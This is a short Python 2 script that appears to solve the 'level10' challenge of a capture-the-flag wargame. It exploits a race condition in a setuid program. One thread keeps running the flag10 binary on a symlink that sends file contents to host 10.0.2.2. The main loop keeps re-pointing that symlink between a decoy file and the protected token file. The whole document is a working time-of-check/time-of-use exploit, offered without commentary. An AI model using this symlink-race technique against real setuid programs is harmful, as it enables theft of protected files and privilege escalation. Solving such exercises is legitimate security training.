from subprocess import call
from thread import *
import time

def spawn_process():
        while 1:
                print "Running\n"
                call(["/home/flag10/flag10", "/home/level10/link", "10.0.2.2"])

start_new_thread(spawn_process, ())

while 1:
        call(["ln", "-sf", "/home/level10/foobar", "/home/level10/link"])
        call(["ln", "-sf", "/home/flag10/token", "/home/level10/link"])